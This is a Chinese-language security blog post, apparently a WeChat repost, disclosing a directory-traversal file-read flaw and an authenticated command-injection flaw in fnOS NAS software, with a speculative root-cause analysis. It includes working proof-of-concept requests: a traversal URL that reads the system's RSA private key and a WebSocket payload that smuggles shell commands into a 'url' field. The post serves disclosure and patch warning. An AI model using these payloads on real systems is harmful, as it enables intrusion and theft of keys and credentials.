---
title: 飞牛系统（fnOS）app-center-static 目录遍历导致的任意文件读取漏洞+命令执行漏洞
url: https://mp.weixin.qq.com/s/jpnS3f2lkmY-NWPM0sDoOQ
source: Doonsec's feed
date: 2026-01-31
fetch_date: 2026-02-01T04:22:30.840918
---

# 飞牛系统（fnOS）app-center-static 目录遍历导致的任意文件读取漏洞+命令执行漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVx8bT9n321bGC277p7RjJOE3XheGgqGjmHyDlWcpXNvgRylcMeW1qibKx2GUQe0qGgVYwt0ic66CnAw/0?wx_fmt=jpeg)

# 飞牛系统（fnOS）app-center-static 目录遍历导致的任意文件读取漏洞+命令执行漏洞

Mrxn
Mrxn

知微守望

![]()

在小说阅读器中沉浸阅读

# 漏洞简介

飞牛系统（fnOS）app-center-static 存在目录遍历导致的列目录和文件读取漏洞,未授权的攻击者可利用该漏洞读取服务器系统上任意文件如私钥(/usr/trim/etc/rsa\_private\_key.pem)、历史记录(/root/.bash\_history)等敏感信息(/root/.psql\_history)，进而可能导致服务器失陷。

# 影响版本

<1.1.15

# 漏洞复现

## 目录遍历

多个路径

```
/app-center-static/serviceicon/trim.media//app-center-static/xxx/xx/
```

我本地复现的是一个早期版本

```
GET /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../usr/trim/etc/rsa_private_key.pem HTTP/1.1Host:
```

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVx8bT9n321bGC277p7RjJOEMAkfxVgdBZibgxKiaxjVE1Zl7xc8guTMvdnlSAs1WSGetJtlXyCqwR3g/640?wx_fmt=png&from=appmsg)

默认向上穿越四级目录即可到根目录

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVx8bT9n321bGC277p7RjJOEeaUUBRX5X4qoUZO8HcJbuEiauUegHYBPhJ1OPfoyiatCfCEgictk9vF3A/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVx8bT9n321bGC277p7RjJOEXRyhj4nIXKBFspW8J4BibcmdGgVYw8UewP10W1XoOYf8ZEWXRM9bDAA/640?wx_fmt=png&from=appmsg)

## 命令执行

本来不太想发 POC 的，但是鉴于官方在 1.15 还是装死，还是公开了。

Disclaimer: 仅供在自搭建的测试实例学习研究使用。

测试 POC：

WebSocket 连接： http://IP:5666/websocket?type=main

请求 Body：

```
cA8dKVgUFNf/5QdKdIa7nEhaup6ObIo6D18J0am+KBQ={"reqid":"697da669697da3bc000000090f31","req":"appcgi.dockermgr.systemMirrorAdd","url":"https://test.example.com ; /usr/bin/touch /tmp/hacked20260131 ; /usr/bin/echo ","name":"2"}
```

SON 前面的内容是 使用浏览器的 localStorage.fnos-Secret 内的值作为 Key 对后面的 JSON 进行 HMAC-SHA256 后的签名。因为这个 Secret 仅在登陆成功后才会设定，因此需要现有一个有效的账户。

payload 放在请求体的 URL 内，成功后会在 /tmp 下创建文件 hacked20260131 。

此漏洞在当前最新版 1.1.15-1493 中仍然存在。

如果这个版本还有问题，那说明前面还有一个 authorization bypass 漏洞（要么是验证不当，要么是 Nginx 反代配置不当）。

> 这里感谢 `@Hantong` 的回复：
> 我能找到的有记录的版本是 https://iso.liveupdate.fnnas.com/x86\_64/trim/fnos-1.1.11-1438.iso, 然后拿官方的那个 https://fnnas.com/api/download-sign POST JSON `{"url": "https://iso.liveupdate.fnnas.com/x86_64/trim/fnos-1.1.11-1438.iso"}` 签个名就行

---

有使用飞牛OS的尽快更新！

# 目录遍历漏洞原因推测

首先想到的是Nginx 配置问题，读取/usr/trim/nginx/conf/conf.d/trim\_app\_center.conf 配置文件发现：

```
location /app-center-static {    proxy_pass http://unix:/var/run/com.trim.app.center.sock:;}
```

Nginx 将 /app-center-static 路径的流量通过 Unix Socket 直接转发给了后端服务，并未在该路径下配置 alias 或静态文件服务，因此漏洞不在 Nginx 层。

后端进程定位： 通过查看进程列表，发现监听该 Socket 的进程为：`root 1452 ... /usr/trim/bin/trim_app_center`
这是一个以 root 用户运行的二进制程序，大概率就是gin框架的漏洞引起，有想法的可以去逆向分析。

下面来自AI的初步推理

1. 确认使用 Gin 框架：

* 在二进制文件 /usr/trim/bin/trim\_app\_center 中发现了 github.com/gin-gonic/gin 字符串，证实该应用是使用 Gin 框架构建的。

2. 漏洞归属：开发者实现错误：

* 非框架原生漏洞：Gin 框架本身的 StaticFS 或 Static 方法通常会处理路径清洗，防止基础的 ../ 遍历。
* 异常参数模式：漏洞通过 ?size= 查询参数触发，这不是 Gin 框架（也非任何主流 Web 框架）处理静态文件的标准方式。
* 典型成因：极有可能是开发者为了实现某种"按需读取"或"文件大小检查"逻辑，手动获取了 size 参数，并直接将其拼接或传递给了文件读取函数（如 os.Open 或 http.ServeFile），而没有进行路径清洗（filepath.Clean）或白名单校验。
* 结论： 该漏洞属于应用层逻辑漏洞（Application Logic Vulnerability），是开发者在使用 Gin 框架开发时编写了不安全的文件处理代码导致的，而非 Gin 框架本身的已知 CVE 漏洞。

详细技术背景

* Gin 的安全机制：Gin 的 c.File() 和 router.Static() 底层通常会调用 http.ServeFile 或类似的安全实现，会对请求路径进行规范化（Cleaning），难以直接通过 URL 路径（如 /static/../../passwd）进行逃逸。
* 漏洞代码推测：

```
// 存在漏洞的伪代码示例func DownloadHandler(c *gin.Context) {    filePath := c.Query("size") // 直接获取 size 参数    // 缺少: filePath = filepath.Clean(filePath)    // 缺少: if !strings.HasPrefix(filePath, allowedDir) { ... }    c.File(filePath) // 或 os.Open(filePath) 后读取内容返回}
```

这种模式绕过了框架自带的路径路由安全机制。

# 参考

```
https://github.com/gin-gonic/gin/issues/4443https://www.v2ex.com/t/1189392https://mrxn.net/news/fnos-Directory-Traversal-rce.html
```

真心感觉自己要学习的知识好多，也有好多大神卧虎藏龙、开源分享。作为初学者，我们可能有差距，不论你之前是什么方向，是什么工作，是什么学历，是大学大专中专，亦或是高中初中，只要你喜欢安全，喜欢渗透，就朝着这个目标去努力吧！有差距不可怕，我们需要的是去缩小差距，去战斗，况且这个学习的历程真的很美，安全真的有意思。但切勿去做坏事，我们需要的是白帽子，是维护我们的网络，安全路上共勉。

**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**公众号**内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**

**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVznM3J1P2rCBhHMicAuicI6usVmTx3l2tyGU2kqmGhmqAt07d1sa9JptK3IuiakDnzAq5deRznMefg6g/0?wx_fmt=png)

知微守望

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVznM3J1P2rCBhHMicAuicI6usVmTx3l2tyGU2kqmGhmqAt07d1sa9JptK3IuiakDnzAq5deRznMefg6g/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过